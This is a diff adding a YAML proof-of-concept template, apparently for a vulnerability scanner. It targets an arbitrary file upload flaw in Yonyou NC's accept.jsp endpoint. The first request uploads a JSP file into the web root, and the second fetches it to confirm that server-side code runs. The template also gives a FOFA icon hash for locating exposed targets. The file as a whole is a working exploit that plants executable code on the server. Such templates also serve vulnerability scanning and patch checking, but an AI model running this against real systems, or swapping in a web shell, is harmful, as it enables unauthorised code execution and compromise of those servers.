@@ -1,0 +1,44 @@
+id: poc-yaml-yong-you-nc-accept-jsp-anyfile-upload
+info:
+  name: 用友NC accept.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友NC
+  fofa: icon_hash="1085941792"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /aim/equipmap/accept.jsp
+  headers:
+    Content-Type: multipart/form-data;boundary=---------------------------16314487820932200903769468567
+  data: '-----------------------------16314487820932200903769468567
+
+    Content-Disposition: form-data; name="upload"; filename="test.txt"
+
+    Content-Type: text/plain
+
+
+    <% out.println("{{.t2}}"); %>
+
+    -----------------------------16314487820932200903769468567
+
+    Content-Disposition: form-data; name="fname"
+
+
+    \webapps\nc_web\{{.t1}}.jsp
+
+    -----------------------------16314487820932200903769468567--'
+  expression: 'status_code == 200
+
+    && contains(body,"The real file")
+
+    && contains(body,"parent.afterUpload(1)")
+
+    '
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
